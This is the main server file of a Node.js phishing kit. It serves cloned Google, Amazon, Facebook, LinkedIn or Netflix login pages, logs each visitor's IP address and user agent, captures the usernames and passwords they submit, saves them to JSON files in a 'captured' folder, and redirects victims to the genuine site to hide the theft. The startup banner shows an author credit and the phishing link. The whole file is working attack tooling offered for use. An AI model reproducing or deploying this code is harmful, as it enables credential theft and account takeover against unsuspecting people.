console.clear()
// libs
const express = require('express')
const fs = require('fs')
const path = require('path')
const session = require('express-session')
const bodyParser = require('body-parser')
const readline = require('readline-sync')
const Table = require('cli-table')
const Info = []
const fakepass = require('./redirect.json')

// def
const app = express()
me = new Table()
info = new Table()

// scripts
const getAgent = require('./scripts/getAgent.js')
const getIp = require('./scripts/getIp.js')

// colors
vermelho = '\033[31m'
verde = '\033[32m'
azul = '\033[34m'

ciano = '\033[36m'
magenta = '\033[35m'
amarelo = '\033[33m'
preto = '\033[30m'
r = '\033[0;0m'
negrito = '\033[1m'

// template
console.log('Chose template:')

sites = ['Google', 'Amazon', 'Facebook', 'Linkedin', 'Netflix']
index = readline.keyInSelect(sites, `${magenta}[Set]${r}`)

const site = sites[index]

if (sites == undefined){
    console.log(`${vermelho}#${negrito} Aborted.${r}`)
    exit()

}

// app config
app.use(session({
	secret: 'secret',
	resave: true,
	saveUninitialized: true
}))
app.use(bodyParser.urlencoded({extended : true}))
app.use(bodyParser.json())

// read link

Info.link = fs.readFileSync("./link.txt", "utf8")



// routes
app.get('/', (req, res) => {

  // send template
  res.sendFile(path.join(__dirname + `/pages/${site}/index.html`))

  // geting ip and user agent
  let ip = getIp(req)
  let agent = getAgent(req)

  // printing...
  Info.ip = ip
  Info.agent = agent
})
app.post('/auth', (req, res)=>{
  var user = req.body.user
  var pwd = req.body.pwd
  Info.user = user
  Info.pass = pwd

  info.push(
    {"Ip":Info.ip},
    {"Agent":Info.agent},
    {"Login":Info.user},
    {"Pass":Info.pass}
  )
  console.log(info.toString())

  fs.writeFile(`captured/${Info.user}.user.json`, `
{
      "username":"${Info.user}",
      "pass":"${Info.pwd}",
      "Ip":"${Info.ip}",
      "User-Agent":"${Info.agent}"
}`, (err, data)=>{


    })


  // redirect user
  if (site == 'Google'){
      res.redirect(fakepass.Google)
      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)

  } if (site == 'Facebook'){
      res.redirect(fakepass.Facebook)
      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)

  } if (site == 'Amazon'){
      res.redirect(fakepass.Amazon)
      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)

  } if (site == 'Linkedin'){
      res.redirect(fakepass.Linkedin)
      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)

  } if (site == 'Netflix'){
      res.redirect(fakepass.Netflix)
      console.log(`${magenta}# User: ${negrito}${user}${verde} Redirected.${r}`)

  }
})

// start server
app.listen(1337, ()=>{
  console.clear()
  me.push(
    {"Template":site}
    ,{"Author":"Gab"}
    ,{"Github:":" https://github.com/gabhm"}
    ,{"Pishing Link":Info.link}
  )
  console.log(me.toString())
})
